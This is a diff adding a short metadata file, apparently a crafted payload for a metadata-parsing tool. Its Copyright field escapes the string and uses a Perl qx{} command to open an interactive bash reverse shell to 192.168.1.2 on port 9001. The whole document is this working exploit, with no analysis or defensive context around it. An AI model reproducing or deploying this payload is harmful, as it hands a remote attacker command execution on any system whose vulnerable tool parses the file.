@@ -1,0 +1,4 @@
+(metadata
+	(Copyright "\
+" . qx{/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.1.2/9001 0>&1'} . \
+" b ") )
